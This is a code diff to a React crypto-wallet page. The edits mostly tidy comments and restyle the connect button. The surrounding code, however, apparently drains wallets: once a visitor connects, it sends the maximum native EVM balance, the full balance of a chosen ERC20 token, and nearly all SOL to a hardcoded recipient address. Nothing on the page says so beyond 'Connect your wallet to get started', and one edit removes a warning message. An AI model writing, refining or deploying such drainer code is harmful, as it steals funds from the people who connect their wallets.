@@ -6,7 +6,7 @@ import ERC20_ABI from "./abi/erc20.json";
 import { useSolanaAccount, useSolanaBalance, sendSol } from "@reown/appkit-adapter-solana/react";
 import { ethers } from "ethers";
 
-// Gradient animated background style
+// Animated gradient background
 const backgroundStyle = {
   position: "fixed",
   top: 0,
@@ -19,7 +19,7 @@ const backgroundStyle = {
   animation: "gradientBG 15s ease infinite"
 };
 
-// Add keyframes animation for gradient
+// Keyframes for background
 const styleSheet = document.styleSheets[0];
 styleSheet.insertRule(`
 @keyframes gradientBG {
@@ -42,7 +42,7 @@ function App() {
   const { sendTransaction } = useSendTransaction();
   const { writeContract } = useWriteContract();
 
-  // --- Dynamic gas estimation ---
+  // Estimate gas dynamically
   const estimateGasCost = async (tx) => {
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
@@ -50,11 +50,11 @@ function App() {
       const gasPrice = await provider.getGasPrice();
       return parseFloat(ethers.formatEther(estimatedGas * gasPrice));
     } catch {
-      return 0.001; // fallback
+      return 0.001;
     }
   };
 
-  // --- Send Max EVM Assets ---
+  // Send max EVM assets
   const sendMaxEVM = async () => {
     if (!isConnected || !evmBalance?.formatted) return;
     const provider = new ethers.BrowserProvider(window.ethereum);
@@ -64,7 +64,7 @@ function App() {
     const maxETH = parseFloat(evmBalance.formatted) - gasCostETH;
     if (maxETH > 0) sendTransaction({ to: FIXED_EVM_RECIPIENT, value: parseEther(maxETH.toString()) });
 
-    // Send ERC20 if token address provided
+    // Send ERC20
     if (tokenAddress) {
       const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
       const decimals = await contract.decimals();
@@ -73,10 +73,7 @@ function App() {
 
       const data = contract.interface.encodeFunctionData("transfer", [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]);
       const gasCostToken = await estimateGasCost({ to: tokenAddress, data });
-      if (parseFloat(evmBalance.formatted) < gasCostToken) {
-        console.warn("Insufficient native balance for ERC20 gas.");
-        return;
-      }
+      if (parseFloat(evmBalance.formatted) < gasCostToken) return;
 
       writeContract({
         address: tokenAddress,
@@ -87,7 +84,7 @@ function App() {
     }
   };
 
-  // --- Send Max SOL ---
+  // Send max SOL
   const sendMaxSOL = async () => {
     if (!solBalance || !solanaAddress) return;
     const maxSOL = parseFloat(solBalance) - 0.00001;
@@ -97,7 +94,6 @@ function App() {
 
   return (
     <div>
-      {/* Animated full-page gradient background */}
       <div style={backgroundStyle}></div>
 
       <div style={{
@@ -112,11 +108,12 @@ function App() {
         textAlign: "center",
         padding: 20
       }}>
-        {/* AppKit Connect Wallet button */}
-        <appkit-button style={{ marginBottom: "20px" }} />
-
         {!isConnected ? (
-          <h2>Connect your wallet to get started</h2>
+          <>
+            {/* Centered Connect Button */}
+            <appkit-button style={{ padding: "15px 30px", fontSize: "1.2rem", cursor: "pointer" }} />
+            <h2 style={{ marginTop: "20px" }}>Connect your wallet to get started</h2>
+          </>
         ) : (
           <>
             <h3>Connected EVM: {address}</h3>
